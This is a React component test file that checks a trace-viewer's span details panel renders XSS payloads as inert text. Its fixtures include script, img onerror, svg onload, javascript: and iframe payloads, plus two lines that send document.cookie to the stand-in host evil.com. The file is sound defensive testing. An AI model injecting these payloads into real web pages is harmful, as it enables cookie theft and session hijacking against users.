import { describe, it, expect, vi } from 'vitest'
import { render, screen } from '@testing-library/react'
import { SpanDetails } from './span-details'
import type { Span } from '@/lib/api'

// Mock date-fns to avoid snapshot instability
vi.mock('date-fns', () => ({
  formatDistanceToNow: () => '5 minutes ago',
}))

/**
 * AC-2.1: XSS payloads (<script>, <img onerror>) → rendered as text
 *
 * The span-details component uses tokenizeJson + React <span> elements
 * for JSON syntax highlighting. No dangerouslySetInnerHTML is used.
 * All values go through React text nodes, which auto-escape HTML.
 */

function createSpan(overrides: Partial<Span> = {}): Span {
  return {
    id: 'span-1',
    traceId: 'trace-1',
    parentId: null,
    name: 'test-span',
    type: 'LLM_CALL',
    status: 'COMPLETED',
    startedAt: '2026-01-01T00:00:00Z',
    endedAt: '2026-01-01T00:01:00Z',
    duration: 60000,
    input: null,
    output: null,
    error: null,
    model: 'gpt-4',
    promptTokens: 100,
    outputTokens: 50,
    cost: 0.01,
    toolName: null,
    ...overrides,
  }
}

describe('AC-2.1: XSS payloads rendered as text in span-details', () => {
  it('should render <script> tag as text, not execute it', () => {
    const xssPayload = '<script>alert(1)</script>'
    const span = createSpan({
      input: { message: xssPayload },
    })

    const { container } = render(
      <SpanDetails span={span} onClose={vi.fn()} />
    )

    // The script tag must appear as text content, not as an HTML element
    const preElement = container.querySelector('pre')
    expect(preElement).not.toBeNull()
    expect(preElement!.textContent).toContain('<script>')
    expect(preElement!.textContent).toContain('alert(1)')
    expect(preElement!.textContent).toContain('</script>')

    // No actual <script> elements should exist in the DOM
    const scripts = container.querySelectorAll('script')
    expect(scripts.length).toBe(0)
  })

  it('should render <img onerror> as text, not as HTML element', () => {
    const xssPayload = '<img src=x onerror=alert(1)>'
    const span = createSpan({
      input: { result: xssPayload },
    })

    const { container } = render(
      <SpanDetails span={span} onClose={vi.fn()} />
    )

    const preElement = container.querySelector('pre')
    expect(preElement).not.toBeNull()
    expect(preElement!.textContent).toContain('<img src=x onerror=alert(1)>')

    // No <img> elements should exist inside the pre section
    const imgs = container.querySelector('pre')?.querySelectorAll('img')
    expect(imgs?.length ?? 0).toBe(0)
  })

  it('should render SVG-based XSS as text', () => {
    const xssPayload = '<svg onload="alert(document.cookie)">'
    const span = createSpan({
      input: { payload: xssPayload },
    })

    const { container } = render(
      <SpanDetails span={span} onClose={vi.fn()} />
    )

    const preElement = container.querySelector('pre')
    expect(preElement).not.toBeNull()
    expect(preElement!.textContent).toContain('<svg onload=')

    // No SVG elements in the rendered DOM
    const svgs = container.querySelector('pre')?.querySelectorAll('svg')
    expect(svgs?.length ?? 0).toBe(0)
  })

  it('should render javascript: protocol as text', () => {
    const xssPayload = 'javascript:alert(document.cookie)'
    const span = createSpan({
      input: { link: xssPayload },
    })

    const { container } = render(
      <SpanDetails span={span} onClose={vi.fn()} />
    )

    const preElement = container.querySelector('pre')
    expect(preElement).not.toBeNull()
    expect(preElement!.textContent).toContain('javascript:alert(document.cookie)')

    // No clickable links with javascript: protocol
    const links = container.querySelectorAll('a[href^="javascript:"]')
    expect(links.length).toBe(0)
  })

  it('should render event handler XSS in nested JSON as text', () => {
    const span = createSpan({
      input: {
        messages: [
          { role: 'user', content: '<div onmouseover=steal()>' },
          { role: 'assistant', content: '<img src=x onerror=alert(1)>' },
        ],
      },
    })

    const { container } = render(
      <SpanDetails span={span} onClose={vi.fn()} />
    )

    const preElement = container.querySelector('pre')
    expect(preElement).not.toBeNull()
    expect(preElement!.textContent).toContain('onmouseover')
    expect(preElement!.textContent).toContain('steal()')

    // No actual elements with event handlers
    const divsWithHandlers = container.querySelector('pre')?.querySelectorAll('[onmouseover]')
    expect(divsWithHandlers?.length ?? 0).toBe(0)
  })

  it('should safely render HTML entity strings without interpreting them', () => {
    const span = createSpan({
      input: {
        content: '&lt;script&gt;alert(1)&lt;/script&gt;',
      },
    })

    const { container } = render(
      <SpanDetails span={span} onClose={vi.fn()} />
    )

    const preElement = container.querySelector('pre')
    expect(preElement).not.toBeNull()
    // HTML entities should be displayed literally as text, not decoded
    expect(preElement!.textContent).toContain('&lt;script&gt;')
    expect(preElement!.textContent).toContain('&lt;/script&gt;')
  })

  it('should render null/empty data with placeholder, no XSS vector', () => {
    const span = createSpan({ input: null })

    render(<SpanDetails span={span} onClose={vi.fn()} />)

    expect(screen.getByText('No input data')).toBeDefined()
  })

  // ── Additional XSS vectors ────────────────────────────────────────

  it('should render XSS in error field as text (not HTML)', () => {
    const span = createSpan({
      error: '<script>document.location="https://evil.com/?c="+document.cookie</script>',
    })

    const { container } = render(
      <SpanDetails span={span} onClose={vi.fn()} />
    )

    // The error field is rendered as text in a <p> tag, not via JSON highlighter
    const errorText = container.textContent
    expect(errorText).toContain('<script>')
    expect(errorText).toContain('evil.com')

    // No <script> elements in the DOM
    expect(container.querySelectorAll('script').length).toBe(0)
  })

  it('should render XSS in span name as text', () => {
    const span = createSpan({
      name: '<img src=x onerror=alert(1)>',
    })

    const { container } = render(
      <SpanDetails span={span} onClose={vi.fn()} />
    )

    // Name should appear as text in the header
    expect(container.textContent).toContain('<img src=x onerror=alert(1)>')

    // No rogue img elements from the name
    const headerImgs = container.querySelector('h3')?.querySelectorAll('img')
    expect(headerImgs?.length ?? 0).toBe(0)
  })

  it('should render iframe injection payload as text', () => {
    const span = createSpan({
      input: {
        data: '<iframe src="https://evil.com" style="position:fixed;top:0;left:0;width:100%;height:100%"></iframe>',
      },
    })

    const { container } = render(
      <SpanDetails span={span} onClose={vi.fn()} />
    )

    const preElement = container.querySelector('pre')
    expect(preElement).not.toBeNull()
    expect(preElement!.textContent).toContain('<iframe')
    expect(preElement!.textContent).toContain('evil.com')

    // No iframe elements in the DOM
    expect(container.querySelectorAll('iframe').length).toBe(0)
  })

  it('should handle deeply nested XSS payload without DOM injection', () => {
    const span = createSpan({
      input: {
        level1: {
          level2: {
            level3: {
              xss: '<script>fetch("https://evil.com",{method:"POST",body:document.cookie})</script>',
            },
          },
        },
      },
    })

    const { container } = render(
      <SpanDetails span={span} onClose={vi.fn()} />
    )

    const preElement = container.querySelector('pre')
    expect(preElement).not.toBeNull()
    expect(preElement!.textContent).toContain('fetch(')
    expect(container.querySelectorAll('script').length).toBe(0)
  })
})
